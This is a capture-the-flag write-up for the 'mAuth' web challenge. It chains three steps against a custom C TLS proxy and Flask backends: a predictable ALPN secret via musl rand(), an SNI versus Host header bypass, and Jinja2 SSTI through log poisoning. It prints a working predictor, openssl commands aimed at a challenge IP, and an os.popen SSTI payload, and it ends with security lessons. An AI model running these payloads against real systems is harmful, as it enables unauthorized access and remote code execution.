# mAuth - Web Challenge

## TL;DR

Bypass of a custom mTLS proxy in C by combining: (1) prediction of the rotating ALPN secret via `srand(time()/300)` with musl libc, (2) abuse of SNI vs Host header discrepancy to route to admin-app without a client certificate, (3) SSTI via log poisoning by injecting a Jinja2 payload into shared logs.

## Description

Custom TLS proxy written in C (Alpine/musl) that protects two Flask backends:
- **public-app** (port 5000): public app with `/flag` endpoint protected by the `X-Proxy-Authenticated` header
- **admin-app** (port 5001): admin panel with `/logs` (renders logs with `render_template_string`) and `/clean`

Both backends share a log volume at `/tmp/app.log`.

## Architecture

```
                   ┌────────────────────────────────────────┐
                   │            tls-proxy (Alpine/C)        │
  Internet:443 ──▶ │  ALPN check → SNI auth → Host routing  │
                   │                                        │
                   │  SNI=challenge.com      → public access │
                   │  SNI=admin.challenge.com → needs client cert │
                   │                                        │
                   │  Host header routing:                   │
                   │    admin.challenge.com → admin-app:5001 │
                   │    *                   → public-app:5000│
                   └──────┬─────────────┬───────────────────┘
                          │             │
                   ┌──────┘             └──────┐
                   ▼                           ▼
            public-app:5000              admin-app:5001
            - GET /flag                  - GET /logs → SSTI!
            - POST /* → logs body        - GET /clean
            - Writes /tmp/app.log        - Reads /tmp/app.log
                   │                           │
                   └───── shared-logs:/tmp ─────┘
```

## Analysis

### Vulnerability 1: Predictable ALPN (CWE-330: Insufficient Randomness)

```c
// proxy.c:152-163
static void generate_random_alpn(char *output, size_t outlen) {
    time_t now = time(NULL);
    time_t window = now / 300;        // 5-minute window
    srand((unsigned int)window);      // predictable seed
    int r1 = rand();
    int r2 = rand();
    int r3 = rand();
    snprintf(output, outlen, "ctf-%08x-%08x-%08x", r1, r2, r3);
}
```

The ALPN is `ctf-XXXXXXXX-XXXXXXXX-XXXXXXXX` generated with `srand(time()/300)`. The seed is predictable (timestamp / 300), so anyone can reproduce the value.

**Critical caveat**: the proxy runs on **Alpine Linux (musl libc)**, whose `rand()` implementation differs from glibc. Using `ctypes.CDLL("libc.so.6")` on a glibc system generates incorrect values. The predictor must be compiled with musl.

### Vulnerability 2: SNI vs Host Header Mismatch (CWE-284: Improper Access Control)

```c
// proxy.c:112-132 - check_access uses SNI
static int check_access(conn_state_t *state) {
    if (strcmp(state->sni, "admin.challenge.com") == 0) {
        if (!state->client_authed) return 0;  // requires cert
    }
    if (strcmp(state->sni, "challenge.com") == 0) {
        return 1;  // public access, no cert
    }
}

// proxy.c:305-313 - routing uses Host header
if (strcmp(host_header, "admin.challenge.com") == 0) {
    backend_host = ADMIN_APP_HOST;    // → admin-app
} else {
    backend_host = PUBLIC_APP_HOST;   // → public-app
}
```

Access verification uses **SNI** but routing uses the **Host header**. By sending:
- `SNI=challenge.com` (passes check_access without cert)
- `Host: admin.challenge.com` (routes to admin-app)

Admin-app is accessed without authentication.

### Vulnerability 3: SSTI via Log Poisoning (CWE-94: Code Injection)

```python
# admin-app/app.py:22-26
@app.get('/logs')
def logs():
    with open('/tmp/app.log', 'r') as f:
        log_content = f.read()
    return render_template_string(log_content)  # SSTI!
```

`render_template_string()` executes Jinja2 templates. The logs come from public-app:

```python
# public-app/app.py:19-21
if request.method == 'POST' and request.get_data():
    body = request.get_data(as_text=True)
    app.logger.info(f"POST {request.path} Body: {body}")  # unsanitized body
```

A POST with a body containing `{{ ... }}` is written to the shared log and executed as a Jinja2 template when accessing `/logs` on admin-app.

## Exploit

### Step 1: Compile ALPN predictor with musl

```c
// gen_alpn.c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    time_t now = time(NULL);
    time_t window = now / 300;
    srand((unsigned int)window);
    int r1 = rand();
    int r2 = rand();
    int r3 = rand();
    printf("ctf-%08x-%08x-%08x\n", r1, r2, r3);
    return 0;
}
```

Statically compiled with musl (inside Alpine):

```bash
docker run --rm -v $(pwd):/work alpine:3.19 sh -c \
  "apk add --no-cache gcc musl-dev && cd /work && gcc -static -o gen_alpn_musl gen_alpn.c"
```

### Step 2: Clean previous logs

```bash
alpn=$(./gen_alpn_musl)
echo -e "GET /clean HTTP/1.1\r\nHost: admin.challenge.com\r\nConnection: close\r\n\r\n" | \
  openssl s_client -connect 46.225.117.62:30004 \
    -servername challenge.com \
    -alpn "$alpn" \
    -quiet -no_ign_eof 2>/dev/null
```

Note: `SNI=challenge.com` to pass auth, `Host: admin.challenge.com` to route to admin-app.

### Step 3: Inject SSTI payload via POST to public-app

```bash
SSTI='{{config.__class__.__init__.__globals__["os"].popen("cat /app/public-app/flag.txt").read()}}'
alpn=$(./gen_alpn_musl)
echo -e "POST /x HTTP/1.1\r\nHost: challenge.com\r\nContent-Type: text/plain\r\nContent-Length: ${#SSTI}\r\nConnection: close\r\n\r\n$SSTI" | \
  openssl s_client -connect 46.225.117.62:30004 \
    -servername challenge.com \
    -alpn "$alpn" \
    -quiet -no_ign_eof 2>/dev/null
```

The payload is written to `/tmp/app.log` via public-app's logger.

### Step 4: Trigger SSTI via admin-app /logs

```bash
alpn=$(./gen_alpn_musl)
echo -e "GET /logs HTTP/1.1\r\nHost: admin.challenge.com\r\nConnection: close\r\n\r\n" | \
  openssl s_client -connect 46.225.117.62:30004 \
    -servername challenge.com \
    -alpn "$alpn" \
    -quiet -no_ign_eof 2>/dev/null
```

`render_template_string()` executes the Jinja2 payload from the log and returns the flag.

### Execution Notes

- The ALPN rotates every 5 minutes (`time()/300`), it must be regenerated between requests if there is a delay
- The flag is not in admin-app's CWD; it is at `/app/public-app/flag.txt` (where public-app reads it at startup)
- `openssl s_client` was used instead of Python `ssl` because the latter had issues with ALPN negotiation against the custom proxy

## Flag

```
upCTF{n3v3r_m4k3_youuuur_0wn_mtls_sxOSqxXPSKhzd70f25bc}
```

## Key Lessons

- **SNI != Host header**: custom proxies that use SNI for auth and Host header for routing create a trivial bypass. Both must be consistent or at least validated together
- **`render_template_string()` on uncontrolled content = SSTI**: never render logs, user files, or any external data as a Jinja2 template
- **PRNG with predictable seed is not a secret**: `srand(time()/300)` is completely reproducible. Use `/dev/urandom` or a CSPRNG for security tokens
- **musl vs glibc `rand()` diverge**: same seed, different outputs. Exploiting PRNG requires matching the exact implementation
- **Shared volumes expand the attack surface**: shared logs between apps enable cross-app injection (log poisoning)

## References

- [Jinja2 SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
- [SNI vs Host Header Attacks](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
- [musl libc rand() implementation](https://git.musl-libc.org/cgit/musl/tree/src/prng/rand.c)
- [RFC 7301 - TLS ALPN Extension](https://tools.ietf.org/html/rfc7301)
